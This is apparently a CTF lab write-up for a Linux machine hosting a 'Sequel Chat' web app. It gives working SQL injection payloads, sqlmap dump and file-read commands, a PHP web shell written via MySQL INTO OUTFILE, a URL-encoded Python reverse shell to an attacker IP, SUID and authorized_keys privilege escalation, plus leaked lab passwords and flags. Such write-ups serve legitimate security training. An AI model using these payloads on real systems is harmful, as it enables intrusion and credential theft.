# Linux Machine



## Machine Info





## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 --open -oN port_scan.txt 10.200.150.152 -Pn

Nmap scan report for 10.200.150.152
Host is up (0.042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a2:16:fe:3b:39:da:6f:db:71:dd:57:e9:17:b4:20:22 (RSA)
|   256 a6:d9:49:e2:24:60:2c:45:64:02:eb:d9:a2:41:d0:94 (ECDSA)
|_  256 03:a7:4c:47:47:6b:68:89:6a:5f:73:ff:e4:38:df:b2 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
1200/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Sequel Chat | Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Initial Access

### Sequel Chat Web Service

An attacker after did a simple Port scan with nmap can see that the target Linux machine has a web service expose on port 1200 called Sequel Chat.

This web service shows a Login page without a way to create a new user. Only who has the credentials can access to the portal.

### SQL Injection

An attacker can perform some attack technique to bypass this Login page. Once of them is the SQL injenction attack.

An attacker can use this payload on the email field to retrive a SQL error message

```
admin123' UNION SELECT 1, where database() like 's%';--    '
```

It means that there is a Bind Boolean based SQL injection to use to obtain DB's informations.

An attacker with this information can intercept the Login request with Burp suite and save it as a file, and use the SQLMap tool to retrive db's information using this flaw.

The follow command can able to an attacker to obtain all dbs presents.

```
sqlmap -r login.req --technique=B --dbs
```

This command can able to a attacker to obtain all information that the db contains after discovered the db name with previous command.

```
sqlmap -r login.req --technique=B -D sequel --dump
```

An attacker dumping the sequel db can obtain the admin's credentials

```
+----+------------------+---------------------+------------------------------------------+
| id | email            | created             | password                                 |
+----+------------------+---------------------+------------------------------------------+
| 1  | admin@sequel.thm | 2025-02-21 09:05:46 | zxQY7tN1iUz9EJ3l8zWezxQY7tN1iUz9EJ3l8zWe |
+----+------------------+---------------------+------------------------------------------+
```

These credentials allow an attacker to access to the website.





***

REading files with sqlmap file-read function



With this command an attacker can retrive mysql root password

{% code overflow="wrap" %}
```
sqlmap -r login.req --file-read=/var/www/html/includes/user_login.php

$db = mysqli_connect('localhost', 'root', 'x5dB97R2PgXkIJtOsrML','sequel') or die('Error Connecting to DB');\r
```
{% endcode %}

With this credentials an attacker obtain the access to the MySQL as a root.

An attacker, can also run a directory bruteforcing searching what directories are expose in the web site for use this credentials.

```
gobuster dir -u http://10.200.150.152:1200/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
```

With this command an attacker can discover the phpmyadmin panel exposes.

With the credentials found an attacker can loggin in the phpmyadmin portal as root.

The MySQL root user by default has the FILE permision to write a file in the machine, and he can try to write a shell.php file into /var/www/html/ directory to obtain a RCE with this query:

```
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' 
```

Now an attacker searching this link can execute arbitrary code into the machine as www-data user.

```
http://10.200.150.152:1200/shell.php?cmd=id
```



An attacker can execute a payload to establish a reverse shell.

Making this request an attacker can check if the python3 is installed on machine

```
http://10.200.150.152:1200/shell.php?cmd=which+python3
```

The python3 is present, with the follow payload an attacker can obtain a reverse shell using python command

{% code overflow="wrap" %}
```
http://10.200.150.152:1200/shell.php?cmd=export%20RHOST%3D%2210.250.1.6%22%3Bexport%20RPORT%3D8899%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
```
{% endcode %}

Now an attacker is logged into the machine as www-data user.



### User Flag

```
cat /user.txt
THM{3e82146f-b010-4d74-a3b8-971de9966d2d}
```



## Privilege Escalation

An attacker with access to the target machine can enumerate the misconfiguration and find these:

### SUIDs&#x20;

runnning this command an attacker can obtain all SUID for the user www-data

```
find / -perm -u=s -type f 2>/dev/null
```

And for the www-data an attacker can exploit the `grep` and `nano` SUID to read whatever file he want. This is the command:

```
LFILE=/root/root.txt
grep '' $LFILE
```

With the nano SUID, the attacker can modify some more privileged file. Then some atempts an attacker can discover that the file `/home/ubuntu/.ssh/authorized_keys` is writable using nano.

At this point an attacker can add his own publick key and make access via SSH as `ubuntu` user.

Can generate his own pub and priv keys with this command on kali machine

```
ssh-keygen -t rsa -b 4096 -f ssh_key
```

Then add using this command the content of the ssh\_key.pub on the `/home/ubuntu/.ssh/authorized_keys` file with this command:

```
nano /home/ubuntu/.ssh/authorized_keys
ssh-rsa REDACTED user@attacker
```

And then an attacker can access via SSH as ubuntu running this command:

```
ssh -i ssh_key ubuntu@10.200.150.152
```



The user ubuntu has all sudo privilege, an attacker can check this out by runnning this command:

```
sudo -l
```

To became root an attacker can run this command:

```
sudo su
```

Now the attacker is logged as root and he has compromise the entire machine.



### Root flag

```
cat /root/root.txt
THM{850ced90-c8bf-4ba7-a364-13dd9026350e}
```
